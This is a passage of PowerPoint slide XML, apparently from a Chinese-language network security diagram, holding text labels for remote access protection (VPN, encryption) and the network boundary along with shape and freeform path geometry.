                <a:rPr lang="zh-CN" altLang="en-US" sz="1200" b="1" dirty="0"/>
                <a:t>远程访问保护（</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1200" b="1" dirty="0"/>
                <a:t>VPN</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1200" b="1" dirty="0"/>
                <a:t>，加密等）</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="en-US" sz="1200" b="1" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98319" name="Text Box 53"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="431" y="3754"/>
              <a:ext cx="23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b="1"/>
                <a:t>边界</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98320" name="Line 54"/>
            <p:cNvSpPr>
              <a:spLocks noChangeAspect="1" noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipH="1">
              <a:off x="187" y="3796"/>
              <a:ext cx="168" cy="1"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="63500" cmpd="dbl">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1" name="Freeform 55"/>
            <p:cNvSpPr>
              <a:spLocks noChangeAspect="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipV="1">
              <a:off x="3398" y="552"/>
              <a:ext cx="1994" cy="2898"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T1" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T2" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T3" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T4" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T5" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T6" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T7" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T8" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T9" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T10" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T11" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T12" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T13" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T14" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T15" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T16" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T17" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T18" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T19" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T20" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T21" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T22" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T23" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T24" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T25" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T26" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T27" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T28" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T29" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T30" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T31" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T32" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T33" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T34" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T35" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T36" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T37" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T38" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T39" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T40" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T41" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T42" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T43" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T44" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T45" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T46" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T47" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T48" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T49" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T50" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T51" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T52" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T53" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T54" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T55" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T56" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T57" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T58" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T59" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T60" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T61" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T62" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T63" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T64" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T65" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T66" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T67" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T68" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T69" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T70" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T71" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T72" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T73" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T74" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T75" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T76" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T77" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T78" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T79" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T80" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T81" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T82" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T83" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T84" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T85" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T86" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T87" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T88" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T89" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T90" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T91" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T92" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T93" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T94" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T95" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T96" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T97" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T98" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T99" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T100" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T101" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T102" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T103" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T104" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T105" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T106" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T107" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T108" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T109" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T110" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T111" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T112" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T113" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T114" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T115" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T116" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T117" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T118" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T119" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T120" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T121" fmla="*/ 2147483647 h 966"/>
                <a:gd name="T122" fmla="*/ 2147483647 w 585"/>
                <a:gd name="T123" fmla="*/ 2147483647 h 9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585"/>
                <a:gd name="T187" fmla="*/ 0 h 966"/>
                <a:gd name="T188" fmla="*/ 585 w 585"/>
                <a:gd name="T189" fmla="*/ 966 h 96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585" h="966">
                  <a:moveTo>
                    <a:pt x="559" y="515"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="559" y="514"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="559" y="513"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="559" y="508"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="558" y="503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="558" y="498"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="557" y="493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="556" y="488"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="554" y="483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="553" y="479"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="554" y="470"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="556" y="465"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="559" y="460"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="560" y="455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="561" y="450"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="562" y="444"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="564" y="441"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="567" y="437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="570" y="433"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="572" y="430"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="574" y="426"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="576" y="422"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="578" y="417"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="579" y="413"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="581" y="409"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="582" y="404"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="583" y="400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="584" y="395"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="584" y="391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="584" y="386"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="585" y="381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="584" y="377"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="584" y="372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="584" y="367"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="583" y="363"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="582" y="359"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="581" y="354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="579" y="350"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="578" y="346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="576" y="342"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="574" y="338"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="572" y="334"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="570" y="330"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="568" y="326"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="565" y="323"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="563" y="319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="560" y="316"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="557" y="313"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="560" y="309"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="563" y="306"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="565" y="302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="567" y="298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="569" y="294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="571" y="289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="572" y="285"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="572" y="280"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="572" y="275"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="572" y="270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="572" y="266"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="571" y="261"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="569" y="257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="567" y="253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="565" y="249"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="563" y="245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="560" y="242"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="557" y="238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="554" y="235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="550" y="232"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="553" y="229"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="556" y="225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="558" y="221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="560" y="217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="562" y="213"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="564" y="209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="566" y="205"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="567" y="200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="568" y="196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="569" y="191"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="570" y="187"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="570" y="182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="571" y="177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="571" y="172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="571" y="168"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="571" y="163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="570" y="159"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="569" y="155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="569" y="151"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="568" y="146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="566" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="565" y="138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="563" y="134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="562" y="130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="560" y="127"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="558" y="123"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="555" y="119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="553" y="116"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="113"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="548" y="109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="545" y="106"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="548" y="103"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="99"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="553" y="94"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="555" y="90"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="557" y="85"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="558" y="81"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="559" y="76"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="559" y="71"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="559" y="67"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="558" y="63"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="557" y="59"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="556" y="55"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="555" y="51"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="553" y="48"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="552" y="44"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="550" y="41"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="547" y="38"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="545" y="35"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="542" y="32"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="539" y="30"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="536" y="27"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="533" y="25"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="529" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="525" y="22"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="522" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="518" y="19"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="510" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="506" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="501" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="496" y="19"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="492" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="487" y="21"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="483" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="479" y="25"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="475" y="28"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="471" y="31"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="468" y="28"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="464" y="26"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="460" y="24"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="456" y="22"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="453" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="448" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="444" y="17"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="440" y="16"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="436" y="14"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="431" y="13"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="427" y="13"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="423" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="418" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="413" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="408" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="403" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="397" y="13"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="392" y="14"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="387" y="15"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="382" y="17"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="377" y="19"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="374" y="16"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="370" y="14"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="366" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="363" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="359" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="355" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="350" y="5"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="346" y="3"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="342" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="338" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="333" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="329" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="324" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="319" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="315" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="311" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="306" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="302" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="298" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="294" y="3"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="290" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="286" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="282" y="7"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="278" y="9"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="274" y="11"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="270" y="13"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="267" y="15"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="263" y="17"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="260" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="257" y="22"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="254" y="25"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="251" y="28"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="248" y="31"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="245" y="28"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="242" y="25"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="239" y="22"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="235" y="19"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="231" y="17"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="228" y="15"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="223" y="13"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="219" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="215" y="11"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="210" y="11"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="206" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="201" y="11"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="196" y="11"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="192" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="188" y="14"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="183" y="15"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="179" y="17"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="176" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="172" y="22"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169" y="26"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="166" y="29"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="162" y="27"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="158" y="25"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="154" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="149" y="22"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="145" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="141" y="19"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="136" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="132" y="17"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="127" y="17"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="123" y="17"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="118" y="16"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113" y="17"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="109" y="17"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="104" y="17"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="95" y="19"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="90" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="86" y="22"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="82" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="78" y="25"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="73" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="68" y="22"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="63" y="21"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57" y="21"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="53" y="21"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="49" y="22"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="45" y="22"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="41" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="25"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="34" y="26"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="31" y="28"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27" y="30"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="35"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="38"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16" y="41"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14" y="44"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10" y="51"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8" y="54"/>
                  </a:lnTo>
                  <a:lnTo>
